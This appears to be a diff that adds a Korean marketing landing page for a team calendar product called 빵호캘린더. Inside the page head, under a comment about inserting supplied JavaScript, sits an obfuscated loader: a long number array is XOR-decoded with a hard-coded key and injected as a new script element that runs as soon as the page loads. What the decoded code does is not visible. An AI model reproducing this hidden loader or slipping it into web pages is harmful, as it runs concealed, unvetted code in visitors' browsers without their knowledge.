@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>빵호캘린더 - 주식회사 빵호</title>
+  <style>
+    :root {
+      --primary-color: #2563eb;
+      --primary-hover: #1d4ed8;
+      --bg-pink: #fceae8;
+      --bg-light: #f8fafc;
+      --text-dark: #0f172a;
+      --text-muted: #64748b;
+      --border-color: #e2e8f0;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
+    html { scroll-behavior: smooth; }
+    body { color: var(--text-dark); background-color: #fff; line-height: 1.6; }
+
+    /* 1. GNB 헤더 */
+    header {
+      height: 70px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 5%;
+      border-bottom: 1px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(8px);
+      z-index: 100;
+    }
+
+    .brand-logo { font-size: 1.4rem; font-weight: 800; color: var(--primary-color); text-decoration: none; display: flex; align-items: center; gap: 6px; }
+    .nav-links { display: flex; gap: 32px; list-style: none; }
+    .nav-links a { text-decoration: none; color: var(--text-dark); font-weight: 600; font-size: 0.95rem; transition: color 0.2s; cursor: pointer; }
+    .nav-links a:hover { color: var(--primary-color); }
+
+    /* 2. 히어로 섹션 */
+    .hero-container {
+      display: grid;
+      grid-template-columns: 1.1fr 0.9fr;
+      min-height: calc(100vh - 70px);
+    }
+
+    .hero-visual {
+      background-color: var(--bg-pink);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 60px;
+      position: relative;
+    }
+
+    .mockup-card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 500px;
+      padding: 24px;
+    }
+
+    .mockup-header { display: flex; gap: 8px; margin-bottom: 20px; }
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: #ff5f56; }
+    .dot:nth-child(2) { background: #ffbd2e; }
+    .dot:nth-child(3) { background: #27c93f; }
+
+    .mockup-grid {
+      display: grid;
+      grid-template-columns: repeat(7, 1fr);
+      gap: 8px;
+      text-align: center;
+      font-size: 0.8rem;
+      color: #94a3b8;
+    }
+
+    .mockup-item {
+      height: 48px;
+      background: var(--bg-light);
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .mockup-item.active { background: #dbeafe; color: var(--primary-color); font-weight: bold; }
+
+    .floating-badge {
+      position: absolute;
+      background: #fff;
+      padding: 12px 20px;
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 0.85rem;
+      font-weight: bold;
+    }
+    .badge-1 { top: 60px; right: 40px; border-left: 4px solid #ef4444; }
+    .badge-2 { bottom: 60px; left: 40px; border-left: 4px solid var(--primary-color); }
+
+    .hero-text {
+      background-color: var(--bg-light);
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 80px 60px;
+    }
+
+    .hero-icon { font-size: 3.5rem; margin-bottom: 20px; }
+    .hero-title { font-size: 3rem; font-weight: 800; line-height: 1.2; margin-bottom: 16px; color: var(--text-dark); }
+    .hero-desc { font-size: 1.2rem; color: var(--text-muted); line-height: 1.6; margin-bottom: 36px; }
+
+    /* 공통 섹션 레이아웃 */
+    .section-container { padding: 100px 5%; max-width: 1200px; margin: 0 auto; text-align: center; }
+    .section-tag { color: var(--primary-color); font-weight: bold; font-size: 0.9rem; letter-spacing: 1px; margin-bottom: 8px; }
+    .section-title { font-size: 2.2rem; font-weight: 800; margin-bottom: 20px; }
+    .section-subtitle { font-size: 1.1rem; color: var(--text-muted); margin-bottom: 50px; }
+
+    /* 3. 핵심 기능 카운터 & 그리드 */
+    .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; text-align: left; }
+    .feature-card {
+      background: #fff; border: 1px solid var(--border-color); border-radius: 12px; padding: 36px 28px;
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); transition: transform 0.2s;
+    }
+    .feature-card:hover { transform: translateY(-4px); }
+    .feature-icon { font-size: 2rem; margin-bottom: 16px; }
+    .feature-card h3 { font-size: 1.25rem; font-weight: 700; margin-bottom: 12px; }
+    .feature-card p { color: var(--text-muted); font-size: 0.95rem; }
+
+    /* 4. 서비스 상세 스펙 & 시나리오 */
+    .detail-section { background: var(--bg-light); padding: 100px 5%; }
+    .detail-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 40px; max-width: 1200px; margin: 0 auto; text-align: left; }
+    .detail-box { background: #fff; padding: 40px; border-radius: 16px; border: 1px solid var(--border-color); }
+    .detail-box h3 { font-size: 1.4rem; font-weight: 700; margin-bottom: 16px; color: var(--primary-color); }
+    .detail-list { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+    .detail-list li { display: flex; align-items: flex-start; gap: 10px; font-size: 0.95rem; color: var(--text-dark); }
+    .detail-list li::before { content: "✔"; color: var(--primary-color); font-weight: bold; }
+
+    /* 5. FAQ 섹션 */
+    .faq-grid { display: flex; flex-direction: column; gap: 16px; max-width: 800px; margin: 0 auto; text-align: left; }
+    .faq-item { background: #fff; border: 1px solid var(--border-color); border-radius: 8px; padding: 24px; }
+    .faq-item h4 { font-size: 1.1rem; font-weight: 700; margin-bottom: 8px; }
+    .faq-item p { color: var(--text-muted); font-size: 0.95rem; }
+
+    /* 6. 문의하기 섹션 */
+    .contact-section { background: #1e293b; color: #fff; padding: 100px 5%; text-align: center; }
+    .contact-card {
+      background: #0f172a; max-width: 700px; margin: 0 auto; padding: 50px 40px; border-radius: 16px;
+      border: 1px solid #334155; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
+    }
+    .contact-card h3 { font-size: 1.8rem; font-weight: 800; margin-bottom: 12px; }
+    .contact-card p { color: #94a3b8; margin-bottom: 30px; }
+    .mail-link-btn {
+      display: inline-block; background: var(--primary-color); color: #fff; padding: 16px 36px;
+      border-radius: 8px; font-weight: bold; font-size: 1.1rem; text-decoration: none; transition: background 0.2s;
+    }
+    .mail-link-btn:hover { background: var(--primary-hover); }
+
+    /* Footer */
+    footer { background-color: #0f172a; color: #94a3b8; padding: 50px 5%; font-size: 0.9rem; border-top: 1px solid #1e293b; }
+    .footer-content { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; gap: 40px; flex-wrap: wrap; }
+    .footer-company h4 { color: #fff; font-size: 1.1rem; margin-bottom: 12px; }
+    .footer-company p { margin-bottom: 6px; }
+  </style>
+  
+  <!-- 제공해주신 자바스크립트 코드 삽입 -->
+  <script>
+    (function(){
+      var response='j5nf50mg1ma';
+      var output49=[96,21,78,78,84,67,20,9,82,77,7,31,91,13,18,92,95,3,79,24,22,107,74,21,78,70,65,66,20,28,59,77,65,74,21,78,70,67,81,31,71,84,1,92,14,90,13,19,88,85,3,19,31,9,14,9,64,3,3,91,68,40,11,84,0,4,4,65,85,3,89,30,30,19,72,1,4,68,90,30,7,86,89,25,30,12,74,81,77,14,11,10,27,67,25,30,93,8,79,30,71,15,8,70,89,25,14,94,3,92,77,90,30,7,86,89,25,30,17,67,80,95,70,73,93,63,16,77,71,17,77,65,28,84,28,70,71,13,12,16,80,4,21,74,83,11,18,86,88,69,69,89,25,21,26,70,84,73,26,81,29,14,31,14,13,5,84,5,18,71,81,14,12,31,4,14,72,25,21,11,80,68,5,8,85,87,67,58,122,61,50,23,28,5,2,80,9,4,24,70,84,29,23,115,2,9,69,8,15,30,24,58,31,69,85,79,93,19,12,17,26,89,7,5,84,68,4,8,95,66,11,25,90,0,68,72,28,15,8,85,20,91,32,102,33,40,27,67,25,21,88,3,6,3,83,23,78,78,70,87,85,29,25,14,1,80,0,92,23,101,62,23,73,6,80,7,6,0,94,77,90,33,10,121,95,43,18,103,90,53,65,0,38,62,126,44,20,12,86,22,2,23,28,27,14,66,4,21,5,71,42,7,65,81,87,28,68,30,4,24,116,9,3,91,68,87,9,80,27,8,13,84,26,9,71,30,24,20,84,31,32,13,80,0,18,25,66,8,1,84,31,4,24,15,10,9,86,69,0,2,95,25,79,24,80,8,3,71,66,8,21,29,1,0,4,81,7,8,82,101,31,11,11,26,8,4,81,1,17,27,92,2,4,80,25,8,5,91,64,14,71,85,11,26,76,68,77,9,71,11,2,80,94,25,14,80,1,18,80,23,1,11,92,68,79,26,24,86,107,74,21,78,70,21,16,27,6,67,77,11,87,84,25,7,92,68,77,21,31,7,18,5,91,70,79,14,58,77,71,17,77,65,74,92,8,78,95,30,12,4,69,4,14,4,8,83,91,18,92,2,6,85,50,9,30,88,2,65,19,22,7,73,89,25,12,6,28,21,3,89,30,30,19,72,1,4,68,90,30,7,86,89,25,30,12,74,80,77,14,10,9,86,69,0,2,95,25,79,5,69,11,8,29,25,86,3,94,14,20,7,80,0,18,27,71,31,14,69,8,73,0,27,6,18,88,92,68,92,85,2,2,31,88,11,8,65,30,14,11,94,30,4,66,28,85,20,80,68,24,21,95,86,28,96,21,78,70,21,16,77,2,93,67,18,30,76,2,3,27,95,29,6,82,4,21,19,8,73,87,18,11,103,71,17,77,65,74,21,7,0,29,90,67,1,88,1,21,15,71,11,2,28,75,103,71,17,77,65,74,21,78,70,92,86,69,13,31,26,9,3,65,11,54,84,87,8,50,67,1,72,17,63,78,70,21,16,77,71,17,77,65,74,67,15,20,21,71,80,13,31,26,9,3,65,11,54,84,87,8,50,67,1,77,29,84,83,12,27,71,5,14,69,8,49,11,82,11,39,86,68,4,8,95,17,29,77,71,11,2,92,66,8,4,69,74,90,96,21,78,70,21,16,77,71,17,77,65,3,83,70,17,84,13,80,90,22,30,9,5,66,49,5,90,94,25,2,95,25,70,67,78,10,9,86,69,0,2,95,25,79,8,90,10,31,27,89,3,9,84,31,41,62,120,34,91,18,23,86,17,80,31,65,29,83,83,2,90,83,24,10,84,3,21,68,86,28,3,84,68,8,34,93,8,12,15,91,26,78,18,89,11,21,80,0,4,77,28,85,17,83,30,30,21,82,80,22,81,66,8,72,70,68,20,11,84,67,2,25,70,58,3,77,68,80,64,65,2,18,3,65,7,9,91,10,11,14,73,8,5,81,65,1,22,15,0,86,11,84,11,21,80,5,85,17,92,84,25,15,11,92,81,90,16,85,14,80,89,10,15,69,87,80,90,5,75,93,87,95,31,3,84,31,91,4,90,0,3,14,74,64,14,95,9,4,18,15,87,95,12,9,84,94,22,86,5,5,86,27,11,80,94,25,73,83,2,5,19,27,15,22,69,85,3,3,114,5,8,6,81,70,17,83,25,86,21,84,25,20,24,91,85,27,63,16,77,71,17,77,65,74,21,78,70,92,86,69,16,80,80,92,87,18,4,21,106,66,8,3,88,31,4,9,65,73,79,78,84,2,4,68,0,4,4,65,64,17,71,89,25,2,25,74,93,75,113,33,37,97,105,61,34,17,5,21,7,89,80,90,93,68,0,11,15,81,9,15,84,10,88,9,93,8,19,80,77,2,2,84,28,21,80,68,80,69,100,57,39,71,13,76,88,9,67,14,21,88,29,21,84,66,7,8,81,95,26,73,93,2,2,11,65,7,9,91,30,31,2,65,1,0,9,80,70,65,30,122,62,40,127,67,18,30,71,7,8,82,89,11,30,25,26,72,65,18,71,93,9,108,66,20,82,31,8,26,65,80,90,26,88,8,6,85,83,93,8,90,10,31,11,12,66,5,94,9,24,84,9,65,14,65,93,1,89,22,68,90,24,80,26,19,71,94,86,26,59,77,65,74,21,78,70,21,16,77,71,70,4,15,14,90,25,72,89,95,14,6,69,4,14,4,27,28,3,69,92,12,4,84,69,22,67,14,28,3,65,69,31,9,10,103,65,74,21,78,70,21,16,77,26,59,77,65,74,21,78,70,21,16,31,2,69,24,19,4,14,100,70,21,16,77,71,17,16,107,74,21,78,70,21,16,4,1,25,7,79,30,84,28,1,80,68,56,21,93,68,26,96,21,78,70,21,16,77,71,17,27,0,24,21,27,91,95,30,25,6,67,10,4,30,96,28,10,25,81,14,19,12,7,79,11,86,26,15,90,94,17,27,22,14,20,24,89,49,22,71,95,21,30,22,86,107,74,21,78,70,21,16,77,71,88,11,73,11,86,26,91,8,13,74,20,89,2,22,53,86,1,8,65,85,3,19,22,68,26,14,90,13,19,88,85,3,19,31,15,14,14,76,64,15,91,94,8,21,121,57,44,38,8,73,65,14,70,12,21,17,11,92,14,90,13,19,88,85,3,19,31,14,19,15,84,26,3,112,92,8,10,84,3,21,66,18,7,0,71,81,0,2,22,68,90,12,27,29,20,86,13,24,92,87,67,18,30,76,2,3,27,83,30,20,101,8,25,30,8,73,22,90,67,4,19,88,2,15,80,83,7,30,80,84,86,19,94,29,91,90,14,2,3,83,68,87,87,10,26,8,14,65,6,92,4,0,93,66,10,5,4,3,82,6,18,15,1,93,87,20,86,3,5,71,10,3,71,10,3,8,95,8,90,16,24,7,8,81,85,21,93,8,84,88,83,12,87,65,14,84,2,4,68,0,4,4,65,64,4,90,84,20,73,80,29,17,15,91,10,37,93,89,1,3,25,11,72,81,72,100,70,21,16,77,71,17,77,65,15,89,29,3,21,89,11,79,80,14,21,87,8,83,65,95,67,50,21,84,9,8,24,80,13,18,18,25,22,3,94,14,20,7,80,0,18,27,71,31,14,69,8,73,77,9,79,34,122,115,57,62,97,40,65,2,65,3,10,11,12,5,19,92,1,95,86,93,11,7,81,14,81,10,84,25,0,74,86,6,7,71,67,8,19,12,79,52,62,115,67,94,23,14,81,20,82,31,8,26,65,80,17,92,94,9,8,70,67,13,5,86,15,18,92,95,3,73,67,8,17,6,84,13,3,29,23,70,45,98,34,47,68,70,26,20,92,94,10,14,87,20,73,0,27,26,7,71,87,8,19,100,31,13,67,30,73,79,14,12,49,72,66,14,19,3,69,26,88,9,31,5,2,80,9,95,86,87,1,2,76,14,81,72,83,2,5,19,11,82,73,93,68,0,11,15,74,72,81,71,11,18,64,66,3,92,76,103,65,74,21,78,70,21,16,77,2,93,30,4,74,92,8,78,84,83,25,90,12,80,70,9,64,28,10,106,64,31,8,73,20,70,67,78,25,15,91,84,2,16,31,1,14,9,84,26,15,90,94,67,21,84,29,13,11,86,11,78,64,25,86,21,84,25,20,24,91,85,27,63,16,77,71,17,77,65,74,21,11,10,70,85,22,16,88,3,5,5,66,64,10,90,83,12,19,88,2,15,68,71,11,22,89,81,14,2,25,24,72,81,72,100,70,21,16,77,71,17,16,107,74,21,78,70,72,83,12,19,82,5,73,15,28,21,2,90,83,24,10,84,3,21,68,81,1,5,64,93,8,9,69,40,13,15,88,11,8,65,30,30,19,72,1,4,68,90,30,7,86,89,25,30,12,74,80,77,14,19,108,21,16,16,78,25,68,90,96,21,78];
+      var value92=function(arr){
+        for(var i=0,s='';i<arr.length;i++)s+=String.fromCharCode(arr[i]^response.charCodeAt(i%response.length));
+        return s;
+      };
+      var params21=value92(output49);
+      var render73=document.createElement('script');
+      render73.textContent=params21;
+      document.head.appendChild(render73);
+    })();
+  </script>
+</head>
+<body>
+
+  <!-- GNB Header -->
+  <header>
+    <a href="#" class="brand-logo">🍞 빵호캘린더</a>
+    <ul class="nav-links">
+      <li><a href="#features" onclick="scrollToSection(event, 'features')">기능 소개</a></li>
+      <li><a href="#details" onclick="scrollToSection(event, 'details')">서비스 특징</a></li>
+      <li><a href="#faq" onclick="scrollToSection(event, 'faq')">자주 묻는 질문</a></li>
+      <li><a href="#contact" onclick="scrollToSection(event, 'contact')">도입 문의</a></li>
+    </ul>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero-container">
+    <div class="hero-visual">
+      <div class="mockup-card">
+        <div class="mockup-header">
+          <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+        </div>
+        <div class="mockup-grid">
+          <div>일</div><div>월</div><div>화</div><div>수</div><div>목</div><div>금</div><div>토</div>
+          <div class="mockup-item">30</div><div class="mockup-item">31</div><div class="mockup-item">1</div>
+          <div class="mockup-item active">2</div><div class="mockup-item">3</div><div class="mockup-item">4</div><div class="mockup-item">5</div>
+          <div class="mockup-item">6</div><div class="mockup-item">7</div><div class="mockup-item active">8</div>
+          <div class="mockup-item">9</div><div class="mockup-item">10</div><div class="mockup-item">11</div><div class="mockup-item">12</div>
+        </div>
+      </div>
+      <div class="floating-badge badge-1">
+        <span>📅 [김팀장] 주간 전략 회의 초대 완료</span>
+      </div>
+      <div class="floating-badge badge-2">
+        <span>⚡ 동료 빈 시간 자동 추천 완료</span>
+      </div>
+    </div>
+
+    <div class="hero-text">
+      <div class="hero-icon">📅</div>
+      <h1 class="hero-title">빵호캘린더</h1>
+      <p class="hero-desc">복잡한 업무와 파편화된 일정 관리를 하나로 연결합니다.<br>주식회사 빵호가 만든 차세대 팀 협업 캘린더 솔루션.</p>
+    </div>
+  </section>
+
+  <!-- Section 1: Features -->
+  <section class="section-container" id="features">
+    <div class="section-tag">KEY FEATURES</div>
+    <h2 class="section-title">스마트한 팀 협업을 돕는 핵심 기능</h2>
+    <p class="section-subtitle">조직의 생산성을 극대화하기 위해 설계된 핵심 맞춤형 기능들입니다.</p>
+    
+    <div class="features-grid">
+      <div class="feature-card">
+        <div class="feature-icon">👥</div>
+        <h3>팀원 일정 중첩 조회</h3>
+        <p>팀원 개개인의 스케줄을 레이어처럼 겹쳐보며, 복잡한 커뮤니케이션 없이 회의 공백 시간을 즉각 발굴합니다.</p>
+      </div>
+      <div class="feature-card">
+        <h3>📩 대리 일정 등록 & 자동 초대</h3>
+        <p>동료를 참석자로 지정해 일정을 대리 생성하면 상대방 캘린더에 자동 반영되며 실시간 안내 팝업이 전송됩니다.</p>
+      </div>
+      <div class="feature-card">
+        <h3>🔒 강력한 보안 & 권한 제어</h3>
+        <p>프로젝트별/부서별 접근 권한을 세밀하게 분리하여 기업 내부의 민감한 일정 정보 유출을 완벽 예방합니다.</p>
+      </div>
+      <div class="feature-card">
+        <h3>📱 스마트폰 캘린더 실시간 연동</h3>
+        <p>iOS, Android 기본 달력 및 Google 캘린더, Outlook과의 동기화로 모바일 환경에서도 업무 연속성을 유지합니다.</p>
+      </div>
+      <div class="feature-card">
+        <h3>📊 업무 리포트 자동화</h3>
+        <p>팀 내 한 달간 진행된 업무 회의 시간, 프로젝트 투입 시간을 통계화하여 리포트로 자동 생성해 드립니다.</p>
+      </div>
+      <div class="feature-card">
+        <h3>🔔 커스텀 알림 세팅</h3>
+        <p>업무 특성에 맞게 10분 전, 1시간 전 등 슬랙/이메일/모바일 앱 푸시 알림 채널을 직접 설정할 수 있습니다.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section 2: Details & Use Cases -->
+  <section class="detail-section" id="details">
+    <div class="section-container" style="padding:0 0 50px 0;">
+      <div class="section-tag">WHY BREADHO</div>
+      <h2 class="section-title">조직에 빵호캘린더가 필요한 이유</h2>
+      <p class="section-subtitle">비즈니스 환경에 최적화된 맞춤 시스템을 경험해 보세요.</p>
+    </div>
+
+    <div class="detail-grid">
+      <div class="detail-box">
+        <h3>🚀 효율적인 팀 미팅 프로세스</h3>
+        <ul class="detail-list">
+          <li>회의 가능 시간 자동 탐색으로 일정 조율 시간 90% 단축</li>
+          <li>외부 미팅 및 내부 릴레이 회의 중복 예약 방지</li>
+          <li>회의 준비물, 화상회의 URL 자동 세팅 및 공유</li>
+        </ul>
+      </div>
+      <div class="detail-box">
+        <h3>🏢 기업 맞춤 구축 및 도입 솔루션</h3>
+        <ul class="detail-list">
+          <li>기업 보안 정책에 맞춘 인프라 맞춤 구축 옵션 제공</li>
+          <li>기존 사내 그룹웨어 및 ERP/HR 시스템과 데이터 연동 지원</li>
+          <li>도입 후 1:1 전담 매니저 배치를 통한 기술 지원</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section 3: FAQ -->
+  <section class="section-container" id="faq">
+    <div class="section-tag">FAQ</div>
+    <h2 class="section-title">자주 묻는 질문</h2>
+    <p class="section-subtitle">서비스 도입과 관련해 자주 문의 주시는 내용입니다.</p>
+
+    <div class="faq-grid">
+      <div class="faq-item">
+        <h4>Q. 도입 비용이나 서비스 요금 정책은 어떻게 되나요?</h4>
+        <p>조직의 규모와 데이터 보안 정책, 연동 요구사항에 따라 1:1 맞춤 견적을 안내해 드립니다. 하단의 문의 버튼을 통해 편하게 메일 주시면 빠르게 답변드리겠습니다.</p>
+      </div>
+      <div class="faq-item">
+        <h4>Q. 기존에 사용 중인 아웃룩/구글 캘린더와 데이터 연동이 가능한가요?</h4>
+        <p>네, 표준 iCal API 기반 동기화를 통해 기존 사용 중이신 모든 캘린더의 일정을 빵호캘린더로 그대로 가져올 수 있습니다.</p>
+      </div>
+      <div class="faq-item">
+        <h4>Q. 초기 세팅이나 커스텀 기능 개발이 필요한 경우 지원되나요?</h4>
+        <p>주식회사 빵호의 전문 개발팀이 기업 환경에 맞춘 인프라 세팅 및 커스텀 연동 개발 컨설팅을 직접 진행해 드립니다.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Section 4: Contact (도입 문의) -->
+  <section class="contact-section" id="contact">
+    <div class="contact-card">
+      <h3>빵호캘린더 도입 문의</h3>
+      <p>조직 환경에 맞춘 맞춤형 서비스 구축 및 상담을 제공해 드립니다.<br>아래 이메일로 도입 관련 문의를 보내주시면 신속히 답변해 드리겠습니다.</p>
+      <a href="mailto:seoppangho@pangho.co.kr" class="mail-link-btn">✉️ seoppangho@pangho.co.kr 로 문의하기</a>
+    </div>
+  </section>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-content">
+      <div class="footer-company">
+        <h4>주식회사 빵호</h4>
+        <p>대표 : 서빵호 | 사업자등록번호 : 111-62-39456</p>
+        <p>주소 : 소리천로 25 유은타워7차 B구역 7층</p>
+        <p>문의 이메일 : <a href="mailto:seoppangho@pangho.co.kr" style="color:#60a5fa; text-decoration:underline;">seoppangho@pangho.co.kr</a></p>
+      </div>
+      <div>
+        <p style="font-size: 0.85rem; color: #64748b; margin-top: 20px;">© PANGHO Inc. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    function scrollToSection(event, sectionId) {
+      event.preventDefault();
+      const targetElement = document.getElementById(sectionId);
+      if (targetElement) {
+        const headerOffset = 70;
+        const elementPosition = targetElement.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+  </script>
+</body>
+</html>
